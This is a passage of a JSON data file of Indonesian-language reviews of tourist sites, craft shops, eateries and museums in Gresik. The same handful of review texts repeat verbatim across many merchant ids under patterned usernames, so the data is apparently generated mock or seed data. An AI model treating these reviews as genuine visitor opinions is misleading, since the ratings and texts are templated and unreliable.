                "id": "r775",
                "merchantId": "m259",
                "userName": "Warkop_Lover_31",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r776",
                "merchantId": "m259",
                "userName": "Sejarah_RI_45",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-16T14:36:35.406Z"
            },
            {
                "id": "r777",
                "merchantId": "m259",
                "userName": "Keluarga_Ceria_85",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-15T14:36:35.406Z"
            },
            {
                "id": "r778",
                "merchantId": "m260",
                "userName": "Neng_Siti_11",
                "rating": 5,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-14T14:36:35.406Z"
            },
            {
                "id": "r779",
                "merchantId": "m260",
                "userName": "Warkop_Lover_75",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-20T14:36:35.406Z"
            },
            {
                "id": "r780",
                "merchantId": "m260",
                "userName": "Sejarah_RI_77",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r781",
                "merchantId": "m261",
                "userName": "Warkop_Lover_95",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r782",
                "merchantId": "m261",
                "userName": "Sejarah_RI_51",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r783",
                "merchantId": "m261",
                "userName": "Keluarga_Ceria_11",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r784",
                "merchantId": "m262",
                "userName": "Warkop_Lover_73",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r785",
                "merchantId": "m262",
                "userName": "Sejarah_RI_18",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r786",
                "merchantId": "m262",
                "userName": "Keluarga_Ceria_29",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r787",
                "merchantId": "m263",
                "userName": "Warkop_Lover_21",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r788",
                "merchantId": "m263",
                "userName": "Sejarah_RI_34",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r789",
                "merchantId": "m263",
                "userName": "Keluarga_Ceria_27",
                "rating": 5,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r790",
                "merchantId": "m264",
                "userName": "Warkop_Lover_29",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-17T14:36:35.406Z"
            },
            {
                "id": "r791",
                "merchantId": "m264",
                "userName": "Sejarah_RI_50",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r792",
                "merchantId": "m264",
                "userName": "Keluarga_Ceria_17",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r793",
                "merchantId": "m265",
                "userName": "Warkop_Lover_54",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r794",
                "merchantId": "m265",
                "userName": "Sejarah_RI_97",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-16T14:36:35.406Z"
            },
            {
                "id": "r795",
                "merchantId": "m265",
                "userName": "Keluarga_Ceria_52",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r796",
                "merchantId": "m266",
                "userName": "Neng_Siti_24",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r797",
                "merchantId": "m266",
                "userName": "Warkop_Lover_21",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r798",
                "merchantId": "m266",
                "userName": "Sejarah_RI_20",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r799",
                "merchantId": "m267",
                "userName": "Warkop_Lover_22",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-25T14:36:35.406Z"
            },
            {
                "id": "r800",
                "merchantId": "m267",
                "userName": "Sejarah_RI_34",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r801",
                "merchantId": "m267",
                "userName": "Keluarga_Ceria_23",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-27T14:36:35.407Z"
            },
            {
                "id": "r802",
                "merchantId": "m268",
                "userName": "Warkop_Lover_98",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-23T14:36:35.407Z"
            },
            {
                "id": "r803",
                "merchantId": "m268",
                "userName": "Sejarah_RI_32",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-16T14:36:35.407Z"
            },
            {
                "id": "r804",
                "merchantId": "m268",
                "userName": "Keluarga_Ceria_47",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-26T14:36:35.407Z"
            },
            {
                "id": "r805",
                "merchantId": "m269",
                "userName": "Warkop_Lover_22",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-20T14:36:35.407Z"
            },
            {
                "id": "r806",
                "merchantId": "m269",
                "userName": "Sejarah_RI_64",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-26T14:36:35.407Z"
            },
            {
                "id": "r807",
                "merchantId": "m269",
                "userName": "Keluarga_Ceria_30",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r808",
                "merchantId": "m270",
                "userName": "Warkop_Lover_25",
                "rating": 5,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-15T14:36:35.407Z"
            },
            {
                "id": "r809",
                "merchantId": "m270",
                "userName": "Sejarah_RI_73",
                "rating": 4,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r810",
                "merchantId": "m270",
                "userName": "Keluarga_Ceria_46",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-16T14:36:35.407Z"
            },
            {
                "id": "r811",
                "merchantId": "m271",
                "userName": "Warkop_Lover_50",
                "rating": 4,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-14T14:36:35.407Z"
            },
            {
                "id": "r812",
                "merchantId": "m271",
                "userName": "Sejarah_RI_78",
                "rating": 5,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-19T14:36:35.407Z"
            },
            {
                "id": "r813",
                "merchantId": "m271",
                "userName": "Keluarga_Ceria_89",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-15T14:36:35.407Z"
            },
            {
                "id": "r814",
                "merchantId": "m272",
                "userName": "Warkop_Lover_95",
                "rating": 4,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-19T14:36:35.407Z"
            },
            {
                "id": "r815",
                "merchantId": "m272",
                "userName": "Sejarah_RI_23",
                "rating": 5,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r816",
                "merchantId": "m272",
                "userName": "Keluarga_Ceria_14",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-17T14:36:35.407Z"
            },
            {
                "id": "r817",
                "merchantId": "m273",
                "userName": "Warkop_Lover_72",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-20T14:36:35.407Z"
            },
            {
                "id": "r818",
                "merchantId": "m273",
                "userName": "Sejarah_RI_18",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-15T14:36:35.407Z"
            },
            {
                "id": "r819",
                "merchantId": "m273",
                "userName": "Keluarga_Ceria_99",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r820",
                "merchantId": "m274",
                "userName": "Warkop_Lover_63",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-27T14:36:35.407Z"
            },
            {
                "id": "r821",
                "merchantId": "m274",
                "userName": "Sejarah_RI_63",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-27T14:36:35.407Z"
            },
            {
                "id": "r822",
                "merchantId": "m274",
                "userName": "Keluarga_Ceria_23",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-26T14:36:35.407Z"
            },
            {
                "id": "r823",
                "merchantId": "m275",
                "userName": "Warkop_Lover_44",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-17T14:36:35.407Z"
            },
            {
                "id": "r824",
                "merchantId": "m275",
                "userName": "Sejarah_RI_18",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r825",
                "merchantId": "m275",
                "userName": "Keluarga_Ceria_33",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r826",
                "merchantId": "m276",
                "userName": "Warkop_Lover_53",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r827",
                "merchantId": "m276",
                "userName": "Sejarah_RI_97",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-20T14:36:35.407Z"
            },
            {
                "id": "r828",
                "merchantId": "m276",
                "userName": "Keluarga_Ceria_48",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-22T14:36:35.407Z"
            },
            {
                "id": "r829",
                "merchantId": "m277",
                "userName": "Warkop_Lover_39",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r830",
                "merchantId": "m277",
                "userName": "Sejarah_RI_70",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-14T14:36:35.407Z"
            },
            {
                "id": "r831",
                "merchantId": "m277",
                "userName": "Keluarga_Ceria_54",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r832",
                "merchantId": "m278",
                "userName": "Warkop_Lover_77",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-27T14:36:35.407Z"
            },
            {
                "id": "r833",
                "merchantId": "m278",
                "userName": "Sejarah_RI_96",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-15T14:36:35.407Z"
            },
            {
                "id": "r834",
                "merchantId": "m278",
                "userName": "Keluarga_Ceria_13",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-26T14:36:35.407Z"
            },
            {
                "id": "r835",
                "merchantId": "m279",
                "userName": "Warkop_Lover_20",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-16T14:36:35.407Z"
            },
            {
                "id": "r836",
                "merchantId": "m279",
                "userName": "Sejarah_RI_90",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-25T14:36:35.407Z"
            },
            {
                "id": "r837",
                "merchantId": "m279",
                "userName": "Keluarga_Ceria_67",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-23T14:36:35.407Z"
            },
            {
                "id": "r838",
                "merchantId": "m280",
                "userName": "Warkop_Lover_75",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-25T14:36:35.407Z"
            },
            {
                "id": "r839",
                "merchantId": "m280",
                "userName": "Sejarah_RI_48",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-23T14:36:35.407Z"
            },
            {
                "id": "r840",
                "merchantId": "m280",
                "userName": "Keluarga_Ceria_80",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r841",
                "merchantId": "m281",
                "userName": "Warkop_Lover_32",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-25T14:36:35.407Z"
            },
            {
                "id": "r842",
                "merchantId": "m281",
                "userName": "Sejarah_RI_81",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-25T14:36:35.407Z"
            },
            {
                "id": "r843",
                "merchantId": "m281",
                "userName": "Keluarga_Ceria_82",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-14T14:36:35.407Z"
            },
            {
                "id": "r844",
                "merchantId": "m282",
                "userName": "Warkop_Lover_10",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-19T14:36:35.407Z"
            },
            {
                "id": "r845",
                "merchantId": "m282",
                "userName": "Sejarah_RI_26",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-15T14:36:35.407Z"
            },
            {
                "id": "r846",
                "merchantId": "m282",
                "userName": "Keluarga_Ceria_93",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-23T14:36:35.407Z"
            },
            {
                "id": "r847",
                "merchantId": "m283",
                "userName": "Warkop_Lover_98",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-14T14:36:35.407Z"
            },
            {
                "id": "r848",
                "merchantId": "m283",
                "userName": "Sejarah_RI_89",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-23T14:36:35.407Z"
            },
            {
                "id": "r849",
                "merchantId": "m283",
                "userName": "Keluarga_Ceria_11",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-16T14:36:35.407Z"
            },
            {
                "id": "r850",
                "merchantId": "m284",
                "userName": "Warkop_Lover_23",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r851",
                "merchantId": "m284",
                "userName": "Sejarah_RI_57",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-16T14:36:35.407Z"
            },
            {
                "id": "r852",
                "merchantId": "m284",
                "userName": "Keluarga_Ceria_20",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-24T14:36:35.407Z"
            },
            {
                "id": "r853",
                "merchantId": "m285",
                "userName": "Warkop_Lover_75",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-18T14:36:35.407Z"
            },
            {
                "id": "r854",
                "merchantId": "m285",
                "userName": "Sejarah_RI_81",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-26T14:36:35.407Z"
            },
            {
                "id": "r855",
                "merchantId": "m285",
                "userName": "Keluarga_Ceria_55",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r856",
                "merchantId": "m286",
                "userName": "Warkop_Lover_38",
                "rating": 4,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-25T14:36:35.407Z"
            },
            {
                "id": "r857",
                "merchantId": "m286",
                "userName": "Sejarah_RI_76",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-24T14:36:35.407Z"
            },
            {
                "id": "r858",
                "merchantId": "m286",
                "userName": "Keluarga_Ceria_41",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r859",
                "merchantId": "m287",
                "userName": "Warkop_Lover_43",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-16T14:36:35.407Z"
            },
            {
                "id": "r860",
                "merchantId": "m287",
                "userName": "Sejarah_RI_35",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r861",
                "merchantId": "m287",
                "userName": "Keluarga_Ceria_94",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-19T14:36:35.407Z"
            },
            {
                "id": "r862",
                "merchantId": "m288",
                "userName": "Warkop_Lover_20",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r863",
                "merchantId": "m288",
                "userName": "Sejarah_RI_69",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r864",
                "merchantId": "m288",
                "userName": "Keluarga_Ceria_98",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-20T14:36:35.407Z"
            },
            {
                "id": "r865",
                "merchantId": "m289",
                "userName": "Warkop_Lover_17",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r866",
                "merchantId": "m289",
                "userName": "Sejarah_RI_50",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-17T14:36:35.407Z"
            },
            {
                "id": "r867",
                "merchantId": "m289",
                "userName": "Keluarga_Ceria_90",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r868",
                "merchantId": "m290",
                "userName": "Warkop_Lover_69",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-16T14:36:35.407Z"
            },
            {
                "id": "r869",
                "merchantId": "m290",
                "userName": "Sejarah_RI_98",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-20T14:36:35.407Z"
            },
            {
                "id": "r870",
                "merchantId": "m290",
                "userName": "Keluarga_Ceria_83",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-17T14:36:35.407Z"
            },
            {
                "id": "r871",
                "merchantId": "m291",
                "userName": "Warkop_Lover_88",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-15T14:36:35.407Z"
            },
            {
                "id": "r872",
                "merchantId": "m291",
                "userName": "Sejarah_RI_18",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-27T14:36:35.407Z"
            },
            {
                "id": "r873",
                "merchantId": "m291",
                "userName": "Keluarga_Ceria_20",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-26T14:36:35.407Z"
            },
            {
                "id": "r874",
                "merchantId": "m292",
                "userName": "Warkop_Lover_53",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-20T14:36:35.407Z"
            },
            {
                "id": "r875",
                "merchantId": "m292",
                "userName": "Sejarah_RI_16",
                "rating": 5,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-27T14:36:35.407Z"
            },
            {
                "id": "r876",
                "merchantId": "m292",
                "userName": "Keluarga_Ceria_53",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-19T14:36:35.407Z"
            },
            {
                "id": "r877",
                "merchantId": "m293",
                "userName": "Warkop_Lover_51",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-14T14:36:35.407Z"
            },
            {
                "id": "r878",
                "merchantId": "m293",
                "userName": "Sejarah_RI_52",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-20T14:36:35.407Z"
            },
            {
                "id": "r879",
                "merchantId": "m293",
                "userName": "Keluarga_Ceria_50",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-15T14:36:35.407Z"
            },
            {
                "id": "r880",
                "merchantId": "m294",
                "userName": "Warkop_Lover_87",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-21T14:36:35.407Z"
            },
            {
                "id": "r881",
                "merchantId": "m294",
                "userName": "Sejarah_RI_46",
                "rating": 4,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r882",
                "merchantId": "m294",
                "userName": "Keluarga_Ceria_31",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-26T14:36:35.407Z"
            },
            {
                "id": "r883",
                "merchantId": "m295",
                "userName": "Warkop_Lover_31",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-22T14:36:35.407Z"
            },
            {
                "id": "r884",
                "merchantId": "m295",
                "userName": "Sejarah_RI_44",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-14T14:36:35.407Z"
            },
            {
                "id": "r885",
                "merchantId": "m295",
                "userName": "Keluarga_Ceria_84",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-20T14:36:35.407Z"
            },
            {
                "id": "r886",
                "merchantId": "m296",
                "userName": "Warkop_Lover_10",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-23T14:36:35.407Z"
            },
            {
                "id": "r887",
                "merchantId": "m296",
                "userName": "Sejarah_RI_13",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-15T14:36:35.407Z"
            },
            {
                "id": "r888",
                "merchantId": "m296",
                "userName": "Keluarga_Ceria_85",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-16T14:36:35.407Z"
            },
            {
                "id": "r889",
                "merchantId": "m297",
